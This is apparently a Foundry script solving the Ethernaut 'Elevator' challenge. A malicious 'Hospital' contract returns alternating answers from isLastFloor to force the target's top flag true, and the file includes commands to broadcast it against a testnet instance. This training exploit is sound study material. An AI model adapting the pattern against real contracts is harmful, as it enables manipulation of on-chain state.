// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {Elevator, Building} from "../src/Elevator.sol";

// cast interface src/Elevator.sol:Elevator
interface IElevator {
    function floor() external view returns (uint256);
    function goTo(uint256 _floor) external;
    function top() external view returns (bool);
}

// $ forge script script/ElevatorExp.s.sol:ForkExp
// $ forge script script/ElevatorExp.s.sol:ForkExp --fork-url $ARBITRUM_SEPOLIA_RPC_URL -vvvvv
contract ForkExp is Script {
    IElevator public contractInstance;
    Building public building;
    address deployer = makeAddr("deployer"); // 0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946
    address attacker = makeAddr("attacker"); // 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e

    function run() external {
        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 1 ether);
        uint256 chainId = block.chainid;
        uint256 randomFloor = uint256(keccak256(abi.encodePacked(block.timestamp))) % 2;
        console2.log("Chain ID:", chainId);
        if (chainId == 31337) {
            vm.startPrank(deployer);
            contractInstance = IElevator(address(new Elevator()));
            vm.stopPrank();
        } else if (chainId == 421614) {
            contractInstance = IElevator(payable(0x66092b4f859764be830a3684f4BFB4D09850284e));
        } else {
            return;
        }

        vm.startPrank(attacker); // Set msg.sender to the attacker address
        Hospital hospital = new Hospital(address(contractInstance));
        hospital.attack(randomFloor);
        require(contractInstance.top() == true);
        vm.stopPrank();
    }
}

// $ forge script script/ElevatorExp.s.sol:onChainExp --fork-url $ARBITRUM_SEPOLIA_RPC_URL -vvvvv
// $ forge script script/ElevatorExp.s.sol:onChainExp --rpc-url $ARBITRUM_SEPOLIA_RPC_URL --account updraft --broadcast --sender $ACCOUNT_SEPOLIA -vvvvv
// $ make elevatorExp ARGS='--network arbiSepolia'
// cast storage 0x66092b4f859764be830a3684f4BFB4D09850284e 0 --rpc-url $SEPOLIA_RPC_URL //top
contract onChainExp is Script {
    IElevator public contractInstance = IElevator(0x66092b4f859764be830a3684f4BFB4D09850284e);
    uint256 randomFloor = uint256(keccak256(abi.encodePacked(block.timestamp))) % 2;

    function run() external {
        vm.startBroadcast();
        Hospital hospital = new Hospital(address(contractInstance));
        hospital.attack(randomFloor);
        require(contractInstance.top() == true);
        vm.stopBroadcast();
    }
}

contract Hospital is Building {
    IElevator public target;
    bool public top;

    constructor(address _target) {
        target = IElevator(_target);
        top = false;
    }

    function attack(uint256 _floor) external {
        target.goTo(_floor);
    }

    function isLastFloor(uint256) external override returns (bool result) {
        result = top;
        top = !top;
    }
}
